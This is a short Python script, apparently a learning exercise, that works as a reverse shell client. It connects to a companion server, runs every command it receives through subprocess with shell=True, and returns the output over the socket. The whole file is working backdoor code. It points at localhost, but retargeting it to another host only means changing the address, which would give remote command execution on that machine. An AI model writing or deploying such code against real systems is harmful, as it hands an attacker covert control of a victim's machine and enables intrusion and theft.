#!/usr/bin/python3


#works with basic commands up to 1024 bytes will crash if exceeded

#we have to create a socket from here then connect to our server in server.py
import socket
import subprocess

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#same ip and port set in server.py
sock.connect(("127.0.0.1",56782)) #connects to server
print("DEBUG Connection established")

while True:

    command = sock.recv(1024)
    new_cmd = command.decode('utf_8')
    print(new_cmd)

    if new_cmd == "q": 
        print("closing connection")#if q is sent we now know the server has closedits connection
        break
    else:
         proc = subprocess.Popen(new_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
         result = proc.stdout.read() + proc.stderr.read()
         sock.sendall(result)
sock.close()
